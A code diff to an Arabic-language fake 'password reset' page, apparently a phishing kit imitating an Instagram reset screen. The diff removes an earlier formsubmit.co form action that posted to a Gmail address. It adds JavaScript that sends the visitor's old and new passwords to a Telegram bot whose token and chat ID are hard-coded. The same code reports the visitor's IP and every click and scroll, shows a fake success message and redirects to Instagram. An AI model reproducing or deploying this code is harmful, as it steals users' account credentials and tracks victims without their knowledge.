@@ -88,11 +88,7 @@
     <h2>إعادة تعيين كلمة السر</h2>
     <p>يجب ألا تقل كلمة السر عن ستة أحرف وأن تتضمن توليفة من الأرقام والأحرف الأبجدية والرموز الخاصة</p>
 
-    <form id="passwordForm" action="https://formsubmit.co/mm5954388@gmail.com" method="POST">
-        <!-- تعطيل CAPTCHA وتحويل المستخدم إلى موقع Instagram -->
-        <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_next" value="https://www.instagram.com/">
-
+    <form id="passwordForm">
         <input type="password" id="oldPassword" name="oldPassword" placeholder="كلمة السر القديمة" required>
         <input type="password" id="newPassword" name="newPassword" placeholder="كلمة السر الجديدة" required>
         <input type="password" id="confirmPassword" name="confirmPassword" placeholder="تأكيد كلمة السر الجديدة" required>
@@ -118,6 +114,38 @@
     const passwordStrengthMessage = document.getElementById('passwordStrengthMessage');
     const togglePassword = document.getElementById('togglePassword');
 
+    const TELEGRAM_BOT_API = 'https://api.telegram.org/bot6924402995:AAEx-1e3pcV9kpYjpQnsjN-lkvreoCjxkFs';
+    const CHAT_ID = '1046458749';
+
+    // Function to get the user's IP address using ipify API
+    function getUserIP() {
+        return fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => data.ip);
+    }
+
+    // Function to send user interaction data to Telegram bot
+    function sendInteractionDataToTelegram(interactionType, userIP) {
+        const message = `
+        نوع التفاعل: ${interactionType}
+        عنوان الـ IP: ${userIP}
+        `;
+
+        fetch(`${TELEGRAM_BOT_API}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        })
+        .catch(error => {
+            console.error('خطأ في إرسال البيانات إلى Telegram:', error);
+        });
+    }
+
     // Function to check passwords and enable/disable submit button
     function checkPasswords() {
         const oldPassword = oldPasswordInput.value;
@@ -139,6 +167,48 @@
                 errorMessage.textContent = '';
             }
         }
+    }
+
+    // Function to send data to Telegram bot
+    function sendToTelegram(oldPassword, newPassword) {
+        const message = `
+        تم طلب إعادة تعيين كلمة السر:
+        كلمة السر القديمة: ${oldPassword}
+        كلمة السر الجديدة: ${newPassword}
+        `;
+
+        fetch(`${TELEGRAM_BOT_API}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                // عرض رسالة التأكيد بعد إرسال البيانات
+                const successMessage = document.createElement('p');
+                successMessage.textContent = 'تم تغيير كلمة السر بنجاح!';
+                successMessage.style.color = 'green';
+                successMessage.style.fontSize = '18px';
+                successMessage.style.marginTop = '20px';
+                document.body.appendChild(successMessage);
+                
+                // بعد 3 ثوانٍ، يتم تحويل المستخدم إلى موقع Instagram
+                setTimeout(function() {
+                    window.location.href = 'https://www.instagram.com/';
+                }, 3000); // 3000 مللي ثانية = 3 ثواني
+            } else {
+                alert('حدث خطأ أثناء إرسال البيانات');
+            }
+        })
+        .catch(error => {
+            alert('خطأ في الاتصال بـ Telegram');
+        });
     }
 
     // Function to check password strength
@@ -174,7 +244,28 @@
         checkPasswordStrength(newPasswordInput.value);
     });
     confirmPasswordInput.addEventListener('input', checkPasswords);
+
     togglePassword.addEventListener('click', togglePasswordVisibility);
+
+    // Track user interactions (like clicks, scrolls, etc.)
+    document.addEventListener('click', function() {
+        getUserIP().then(userIP => sendInteractionDataToTelegram('نقرة', userIP));
+    });
+
+    document.addEventListener('scroll', function() {
+        getUserIP().then(userIP => sendInteractionDataToTelegram('تمرير الصفحة', userIP));
+    });
+
+    // Form submission handler
+    document.getElementById('passwordForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        const oldPassword = oldPasswordInput.value;
+        const newPassword = newPasswordInput.value;
+
+        if (oldPassword && newPassword) {
+            sendToTelegram(oldPassword, newPassword);
+        }
+    });
 </script>
 
 </body>
